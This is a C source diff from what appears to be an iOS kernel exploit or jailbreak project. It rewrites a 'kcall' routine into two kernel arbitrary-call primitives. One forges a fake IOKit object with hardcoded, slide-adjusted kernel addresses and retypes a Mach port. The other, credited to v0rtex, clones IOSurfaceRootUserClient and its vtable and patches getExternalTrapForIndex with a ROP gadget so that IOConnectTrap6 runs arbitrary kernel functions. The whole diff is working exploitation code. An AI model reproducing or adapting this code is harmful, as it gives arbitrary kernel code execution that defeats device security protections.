@@ -11,6 +11,7 @@
 #include "symbols.h"
 #include "early_kalloc.h"
 
+
 extern void textLog(const char *message, ...);
 
 extern uint64_t
@@ -150,116 +151,219 @@ uint64_t obj_kaddr = 0;
 // that compiles to:
 //   STR             W20, [X19,#8] <-- 32-bit store
 
+#include "kutils.h"
+
+uint64_t kcall_aw(uint64_t fptr, uint64_t args[7]);
+uint64_t kcall_v0rtex(uint64_t fptr, uint64_t args[7]);
+
 uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
-  uint64_t args[7] = {0};
-  va_list ap;
-  va_start(ap, argc);
-  
-  if (argc > 7) {
-    textLog("too many arguments to kcall\n");
-    return 0;
-  }
-  
-  for (int i = 0; i < argc; i++){
-    args[i] = va_arg(ap, uint64_t);
-  }
-  
-  va_end(ap);
-  
-  if (arbitrary_call_port == MACH_PORT_NULL) {
-    // build the object:
-    // allocate some memory to hold a fake iokit object:
-    obj_kaddr = early_kalloc(0x1000);
-    textLog("kcall object allocated via early_kalloc at %llx\n", obj_kaddr);
-    
-    // fill in the fields:
-    wk64(obj_kaddr + 0, obj_kaddr+0x800); // vtable pointer
-    
-    // IOExternalTrap
-    wk64(obj_kaddr + 0x50, 0);       // the function pointer is actually a pointer-to-member-method, so needs a 0 here too
-                                     // see this old bug where I discuss pointer-to-member-methods:
-                                     // https://bugs.chromium.org/p/project-zero/issues/detail?id=20
-    
-    wk32(obj_kaddr + 0x9c, 0x1234); // __ipc
-    
-    // vtable:
-    wk64(obj_kaddr + 0x800 + 0x20,  ksym(KSYMBOL_RET)); // vtable::retain
-    wk64(obj_kaddr + 0x800 + 0x28,  ksym(KSYMBOL_RET)); // vtable::release
-    wk64(obj_kaddr + 0x800 + 0x38,  ksym(KSYMBOL_IOUSERCLIENT_GET_META_CLASS)); // vtable::getMetaClass
-    wk64(obj_kaddr + 0x800 + 0x5b8, ksym(KSYMBOL_CSBLOB_GET_CD_HASH)); // vtable::getExternalTrapForIndex
-    wk64(obj_kaddr + 0x800 + 0x5c0, ksym(KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX));
-    
-    // allocate a port
-    kern_return_t err;
-    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &arbitrary_call_port);
-    if (err != KERN_SUCCESS) {
-      textLog("failed to allocate port\n");
-      return 0;
+    uint64_t args[7] = {0};
+    va_list ap;
+    va_start(ap, argc);
+
+    if (argc > 7) {
+        textLog("too many arguments to kcall\n");
+        return 0;
     }
-    
-    // get a send right
-    mach_port_insert_right(mach_task_self(), arbitrary_call_port, arbitrary_call_port, MACH_MSG_TYPE_MAKE_SEND);
-    
-    // locate the port
-    uint64_t port_addr = find_port_address(arbitrary_call_port, MACH_MSG_TYPE_COPY_SEND);
-    
-    // change the type of the port
+
+    for (int i = 0; i < argc; i++){
+        args[i] = va_arg(ap, uint64_t);
+    }
+
+    va_end(ap);
+
+    uint64_t return_val;
+
+    if (have_kmem_write()) {
+        return_val = kcall_v0rtex(fptr, args);
+    } else {
+        return_val = kcall_aw(fptr, args);
+    }
+
+    textLog("return val %llx\n", return_val);
+
+    return return_val;
+}
+
+uint64_t kcall_aw(uint64_t fptr, uint64_t args[7]) {
+    if (arbitrary_call_port == MACH_PORT_NULL) {
+        // build the object:
+        // allocate some memory to hold a fake iokit object:
+        obj_kaddr = early_kalloc(0x1000);
+        textLog("kcall object allocated via early_kalloc at %llx\n", obj_kaddr);
+
+        // fill in the fields:
+        wk64(obj_kaddr + 0, obj_kaddr+0x800); // vtable pointer
+
+        // IOExternalTrap
+        wk64(obj_kaddr + 0x50, 0);       // the function pointer is actually a pointer-to-member-method, so needs a 0 here too
+        // see this old bug where I discuss pointer-to-member-methods:
+        // https://bugs.chromium.org/p/project-zero/issues/detail?id=20
+
+        wk32(obj_kaddr + 0x9c, 0x1234); // __ipc
+
+        uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
+
+        // vtable:
+        wk64(obj_kaddr + 0x800 + 0x20,  slide+0xFFFFFFF0070C873C); // vtable::retain
+        wk64(obj_kaddr + 0x800 + 0x28,  slide+0xFFFFFFF0070C873C); // vtable::release
+        wk64(obj_kaddr + 0x800 + 0x38,  slide+0xFFFFFFF007533CF8); // vtable::getMetaClass
+        wk64(obj_kaddr + 0x800 + 0x5b8, slide+0xFFFFFFF0073B71E4); // vtable::getExternalTrapForIndex
+        wk64(obj_kaddr + 0x800 + 0x5c0, slide+0xFFFFFFF0075354A0);
+
+        // allocate a port
+        kern_return_t err;
+        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &arbitrary_call_port);
+        if (err != KERN_SUCCESS) {
+            textLog("failed to allocate port\n");
+            return 0;
+        }
+
+        // get a send right
+        mach_port_insert_right(mach_task_self(), arbitrary_call_port, arbitrary_call_port, MACH_MSG_TYPE_MAKE_SEND);
+
+        // locate the port
+        uint64_t port_addr = find_port_address(arbitrary_call_port, MACH_MSG_TYPE_COPY_SEND);
+
+        // change the type of the port
 #define IKOT_IOKIT_CONNECT 29
 #define IO_ACTIVE   0x80000000
-    wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_CONNECT);
-    
-    // cache the current space:
-    //uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
-    
-    // change the space of the port
-    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
-    
-    // set the kobject
-    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
-  }
-  
-  // put arg0 and the function pointer in the right place
-  wk64(obj_kaddr + 0x40, args[0]);
-  wk64(obj_kaddr + 0x48, fptr);
-  
-  // call the external trap:
-  uint64_t return_val = iokit_user_client_trap(arbitrary_call_port, 0,
-                                               args[1],
-                                               args[2],
-                                               args[3],
-                                               args[4],
-                                               args[5],
-                                               args[6]);
-  
-  textLog("return val %llx\n", return_val);
-  
+        wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_CONNECT);
+
+        // cache the current space:
+        //uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
+
+        // change the space of the port
+        wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
+
+        // set the kobject
+        wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
+    }
+
+    // put arg0 and the function pointer in the right place
+    wk64(obj_kaddr + 0x40, args[0]);
+    wk64(obj_kaddr + 0x48, fptr);
+
+    // call the external trap:
+    uint64_t return_val = iokit_user_client_trap(arbitrary_call_port, 0,
+                                                 args[1],
+                                                 args[2],
+                                                 args[3],
+                                                 args[4],
+                                                 args[5],
+                                                 args[6]);
+
 #if 0
-  // clear the kobject
-  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
-  
-  // reset the space
-  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
-  
-  // reset the type
+    // clear the kobject
+    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
+
+    // reset the space
+    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
+
+    // reset the type
 #define IKOT_NONE 0
-  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
-  
-  // release the port
-  mach_port_destroy(mach_task_self(), port);
+    wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
+
+    // release the port
+    mach_port_destroy(mach_task_self(), port);
 #endif
 
-  return return_val;
+    return return_val;
 }
 
 
+typedef mach_port_t io_connect_t;
+kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
+extern mach_port_t user_client;
+
+uint64_t kcall_v0rtex(uint64_t fptr, uint64_t args[7]) {
+    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
+    static uint64_t IOSurfaceRootUserClient_port = 0;
+    static uint64_t IOSurfaceRootUserClient_addr = 0;
+    static uint64_t IOSurfaceRootUserClient_vtab = 0;
+
+    if (IOSurfaceRootUserClient_vtab == 0) {
+        IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
+        IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
+        IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    }
+
+    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
+    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
+
+    // Create the vtable in the kernel memory, then copy the existing vtable into there
+    static uint64_t fake_vtable = 0;
+    static uint64_t fake_client = 0;
+
+    if (!(fake_vtable && fake_client)) {
+        fake_vtable = kmem_alloc(0x1000);
+        textLog("Created fake_vtable at %016llx\n", fake_vtable);
+
+        for (int i = 0; i < 0x200; i++) {
+            wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
+        }
+
+        textLog("Copied some of the vtable over\n");
 
 
+        // Create the fake user client
+        fake_client = kmem_alloc(0x1000);
+        textLog("Created fake_client at %016llx\n", fake_client);
 
+        for (int i = 0; i < 0x200; i++) {
+            wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
+        }
 
+        textLog("Copied the user client over\n");
 
+        // Write our fake vtable into the fake user client
+        wk64(fake_client, fake_vtable);
 
+        // Now the userclient port we have will look into our fake user client rather than the old one
 
+        uint64_t find_add_x0_x0_0x40_ret(void);
+        // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
+        wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
 
+        textLog("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+    }
 
+    // Replace the user client with ours
+    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
 
+    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
+    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
+    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
+    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
+    // through like normal.
+
+    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
+    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
+    // (i'm not actually sure if the switch back is necessary but meh
+    #define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
+    do { \
+    uint64_t offx20 = rk64(fake_client+0x40); \
+    uint64_t offx28 = rk64(fake_client+0x48); \
+    wk64(fake_client+0x40, x0); \
+    wk64(fake_client+0x48, addr); \
+    err = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6)); \
+    wk64(fake_client+0x40, offx20); \
+    wk64(fake_client+0x48, offx28); \
+    } while (0);
+
+    kern_return_t err;
+
+    KCALL(fptr, args[0],
+          args[1],
+          args[2],
+          args[3],
+          args[4],
+          args[5],
+          args[6]);
+
+    // cleanup
+    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
+
+    return err;
+}
 
